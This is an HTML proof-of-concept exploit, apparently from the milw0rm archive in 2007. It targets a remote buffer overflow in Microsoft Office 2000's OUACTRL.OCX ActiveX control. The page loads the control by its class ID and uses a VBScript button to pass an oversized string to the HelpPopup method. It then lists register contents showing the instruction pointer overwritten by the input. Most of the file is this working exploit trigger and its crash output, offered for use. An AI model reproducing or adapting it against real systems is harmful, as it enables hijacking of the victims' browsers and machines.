@@ -1,0 +1,44 @@
+<pre>
+<span style="font: 14pt Courier New;"><p align="center"><b>2007/05/23</b></p></span>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">---------------------------------------------------------------------------------------------------------------------------
+ <b>Microsoft Office 2000 Controllo UA di Microsoft Office (OUACTRL.OCX v. 1.0.1.9) "HelpPopup" method Remote Buffer Overflow
+ and winhlp32.exe Denial of Service (hey, don't you think this is a very long title :)</b>
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ 
+ control is set as:
+ RegKey Safe for Script: True
+ RegKey Safe for Init: True
+---------------------------------------------------------------------------------------------------------------------------
+
+<object classid='clsid:8936033C-4A50-11D1-98A4-00A0C90F27C6' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language = 'vbscript'>
+ Sub tryMe()
+  buff = String(1000, "a")
+
+  test.HelpPopup buff, "default"
+ End Sub
+</script>
+
+Registers content:
+
+EAX 00000000
+ECX 7E39EC0C USER32.7E39EC0C
+EDX 7C91EB94 ntdll.KiFastSystemCallRet
+EBX 38CFD2D0 OUACTRL.38CFD2D0
+ESP 01D0F434 UNICODE "aaaa..."
+EBP 00610061
+ESI 02ACC86C
+EDI 00000000
+
+EIP 00610061
+</span></span>
+
+</code></pre>
+
+# milw0rm.com [2007-05-23]
